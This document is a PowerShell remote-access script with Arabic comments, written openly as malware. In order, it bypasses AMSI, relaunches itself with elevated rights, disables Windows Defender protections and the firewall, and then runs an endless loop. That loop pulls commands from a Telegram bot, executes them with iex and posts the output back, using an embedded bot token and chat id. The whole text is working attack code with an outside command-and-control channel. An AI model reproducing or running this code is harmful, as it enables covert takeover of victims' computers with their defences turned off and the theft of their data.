# --- [1] كسر الحماية النووي (Zero-Day AMSI Bypass) ---
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)))

# --- [2] السيطرة المطلقة (Root/System Elevation) ---
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $newProcess = New-Object System.Diagnostics.ProcessStartInfo "powershell.exe"
    $newProcess.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    $newProcess.Verb = "runas"
    [System.Diagnostics.Process]::Start($newProcess)
    exit
}

# --- [3] تعطيل جميع دروع الحماية (The Blackout) ---
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection Combined -Force
netsh advfirewall set allprofiles state off

# --- [4] إعدادات الاتصال الحي (Live C2) ---
$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$c = "7393359923"

# دالة لإرسال النتائج فوراً
function Send-Live { param($data) curl.exe -s -X POST "https://api.telegram.org/bot$t/sendMessage" -d "chat_id=$c&text=$data" }

Send-Live "👑 OVERLORD INITIALIZED: SYSTEM ACCESS SECURED. WAITING FOR COMMANDS..."

# --- [5] حلقة التحكم اللانهائية (Live Shell Loop) ---
$lastUpdate = 0
while($true) {
    try {
        $response = Invoke-RestMethod "https://api.telegram.org/bot$t/getUpdates?offset=-1"
        if ($response.result) {
            $cmd = $response.result[0].message.text
            $updateId = $response.result[0].update_id
            
            if ($updateId -ne $lastUpdate) {
                $lastUpdate = $updateId
                # تنفيذ الأمر في بيئة معزولة وإرسال النتيجة
                $output = iex $cmd 2>&1 | Out-String
                if ($output) { Send-Live "💻 Output:`n$output" }
            }
        }
    } catch { }
    Start-Sleep -Milliseconds 500 # استجابة لحظية (نص ثانية)
}
